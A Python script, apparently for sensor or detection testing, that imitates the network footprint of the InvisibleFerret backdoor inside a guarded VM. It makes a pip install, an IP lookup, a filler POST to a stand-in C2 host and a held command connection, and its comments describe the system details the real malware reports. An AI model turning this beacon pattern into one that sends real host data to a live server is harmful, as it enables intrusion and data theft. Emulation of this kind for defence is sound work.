# The backdoor (the write-ups' InvisibleFerret, its `pay` part), which the
# stand-in serves at /payload/7 and client.py saves as ~/.c3/run and starts.
# What a sensor saw of the real one on a Mac, and no more: pip asked for a
# module it wants, a look-up of the machine's public address, a report to
# the server, and a connection to the server's second port held open for
# commands. Here the report is filler, the look-up's answer is dropped, and
# the connection is held for two minutes with nothing sent or read: no
# command is taken and none is run.
#
# It runs only on a recording VM, and stops at once anywhere else.
import ipaddress
import os
import socket
import subprocess
import sys
import time
import urllib.request

HOST = "cdn.shop-metrics.example"
PORT = 1224
COMMANDS = 1245

if not os.path.exists("/etc/tangent-eval-vm") or not ipaddress.ip_address(socket.gethostbyname(HOST)).is_private:
    sys.exit(0)

# 1. The real one installs the modules it lacks with pip before anything else.
try:
    import requests  # noqa: F401
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], stdin=subprocess.DEVNULL,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# 2. Where the machine is, by the service the real one asks.
try:
    urllib.request.urlopen("http://ip-api.com/json", timeout=15).read()
except OSError:
    pass

# 3. The report: in the real one the host's name, the user, the system and
#    the address. Here, filler.
try:
    urllib.request.urlopen(urllib.request.Request(f"http://{HOST}:{PORT}/keys", data=b"x" * 512, method="POST"), timeout=15).read()
except OSError:
    pass

# 4. The command connection.
try:
    with socket.create_connection((HOST, COMMANDS), timeout=15):
        time.sleep(120)
except OSError:
    pass
